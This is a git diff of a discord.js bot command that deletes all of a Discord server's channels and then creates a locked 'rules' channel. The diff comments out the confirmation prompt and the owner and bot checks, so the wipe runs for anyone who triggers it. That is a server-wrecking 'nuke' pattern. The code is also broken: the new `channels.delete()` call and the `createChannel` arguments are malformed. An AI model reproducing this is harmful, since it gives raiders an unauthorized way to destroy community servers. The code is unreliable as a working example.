@@ -2,15 +2,13 @@ const discord = require("discord.js")
 const config = require('../config.json')
 
 module.exports.run = (bot, message, args) => {
- message.reply('Do you really want me to delete all channels? This is NOT reversable!')
- if(!message.author.id == message.guild.ownerID) return message.delete(500);
- message.react('👍')
- message.react('👎')
- if(!message.reactions.size == 2) return message.channel.send('Finding users that reacted')
- if(message.author.bot) return;
- message.guild.channels.forEach((ch) => {
-  ch.delete()
- })
+// message.reply('Do you really want me to delete all channels? This is NOT reversable!')
+//if(!message.author.id == message.guild.ownerID) return message.delete(500);
+// message.react('👍')
+// message.react('👎')
+//if(!message.reactions.size == 2) return message.channel.send('Finding users that reacted')
+// if(message.author.bot) return;
+ message.guild.channels.delete()
  message.guild.createChannel('rules', 'text' [{
   deny: ['SEND_MESSAGES'],
 }])
